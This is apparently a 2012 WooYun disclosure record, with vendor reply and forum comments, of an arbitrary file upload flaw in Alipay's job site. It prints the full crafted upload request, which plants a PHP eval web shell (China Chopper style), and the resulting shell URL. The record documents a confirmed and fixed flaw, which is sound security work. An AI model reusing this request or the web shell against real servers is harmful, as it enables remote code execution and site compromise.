{"id": 19564, "wybug_id": "wooyun-2012-06870", "wybug_title": "支付宝某频道任意文件上传漏洞", "wybug_corp": "支付宝", "wybug_author": "Jannock", "wybug_date": "2012-05-09 17:12", "wybug_open_date": "2012-06-23 17:13", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["文件上传内容未检查", "扫描监控缺失", "任意文件上传"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-05-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-05-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-05-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-05-31：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-06-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-06-23：\t细节向公众公开  简要描述： 今天看到http://www.wooyun.org/bugs/wooyun-2010-06862，表示振惊，不过没有绝对的安全，于是又无聊地看了一下，发现某频道任意文件上传，不过那频道应该不算太重要。。。 详细说明：  频道：http://job.alipay.com/支付宝招聘在修改简历时附件上传那里，由于没有判断上传类型，造成文件上传漏洞。抓包改包。POST /index.php?r=attachment/upload HTTP/1.1Accept: text/*Content-Type: multipart/form-data; boundary=----------Ef1ei4ei4GI3Ef1gL6Ij5gL6Ef1Ij5User-Agent: Shockwave FlashHost: job.alipay.comContent-Length: 776Connection: Keep-AliveCache-Control: no-cacheCookie: 这里自己加上------------Ef1ei4ei4GI3Ef1gL6Ij5gL6Ef1Ij5Content-Disposition: form-data; name=\"Filename\"aa.php------------Ef1ei4ei4GI3Ef1gL6Ij5gL6Ef1Ij5Content-Disposition: form-data; name=\"kind\"5------------Ef1ei4ei4GI3Ef1gL6Ij5gL6Ef1Ij5Content-Disposition: form-data; name=\"fileext\"*.doc;*.docx;*.rar;*.zip;*.php------------Ef1ei4ei4GI3Ef1gL6Ij5gL6Ef1Ij5Content-Disposition: form-data; name=\"folder\"/------------Ef1ei4ei4GI3Ef1gL6Ij5gL6Ef1Ij5Content-Disposition: form-data; name=\"Filedata\"; filename=\"aa.php\"Content-Type: application/octet-streamPK.........<?php @eval($_POST['chopper']);?>------------Ef1ei4ei4GI3Ef1gL6Ij5gL6Ef1Ij5Content-Disposition: form-data; name=\"Upload\"Submit Query------------Ef1ei4ei4GI3Ef1gL6Ij5gL6Ef1Ij5--只留下：http://job.alipay.com/resume/resumeattach/other/201205/20120509_050149_13.php小马删除了。   漏洞证明：  http://job.alipay.com/resume/resumeattach/other/201205/20120509_050149_13.php\n\n\n\n   修复方案：  应该懂   版权声明：转载请注明来源 Jannock@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2012-05-11 15:24 厂商回复： 漏洞已完成修复，非常感谢对支付宝安全工作的支持。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-05-09 17:16 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  我信洞主    \n     2012-05-09 17:19 |    \t\tp.z  \t\t\t( 普通白帽子  |\t\t\t        Rank:411 漏洞数:40        )\t\t \n  支付宝这是肿么了    \n     2012-05-09 17:20 |    \t\tgoderci \t\t\t( 普通白帽子  |\t\t\t        Rank:542 漏洞数:47        | http://www.yunday.org)\t\t \n  洞主！我信！    \n     2012-05-09 17:33 |    \t\tRay \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:7        )\t\t \n  我信洞主    \n     2012-05-09 17:40 |    \t\t_Evil \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:59        | 万事无他,唯手熟尔。农民也会编程,别指望天...)\t\t \n  洞主是wooyun的神器,不信它能信谁呢?    \n     2012-05-09 17:45 |    \t\td4rkwind \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:2        | 关注web 安全，产品安全)\t\t \n  牛逼    \n     2012-06-23 19:50 |    \t\tMr.杨总 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:4        | 绿色 无毒  你懂得。。。。心要宽 。。。)\t\t \n  哎哟我信    \n     2012-06-23 20:35 |    \t\tMaster \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:10        )\t\t \n  这个果真是很给力。    \n     2012-06-23 22:01 |    \t\t_Evil \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:59        | 万事无他,唯手熟尔。农民也会编程,别指望天...)\t\t \n  *.doc;*.docx;*.rar;*.zip;*.php    \n     2012-06-23 23:41 |    \t\t冰锋刺客 \t\t\t( 普通白帽子  |\t\t\t        Rank:113 漏洞数:14        | 请在监护人陪同下与本人交流)\t\t \n  很给力啊       \n     2012-07-12 17:22 |    \t\tblack hook \t\t\t( 路人 |\t\t\t        Rank:28 漏洞数:8        | 新人、)\t\t \n  我想问问这个SHELL是神马。求    \n     2012-07-13 08:46 |    \t\t一刀终情 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:28        | ‮‮PKAV技术宅社区-安全爱好者)\t\t \n  @black hook 目测，菜刀连的~    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}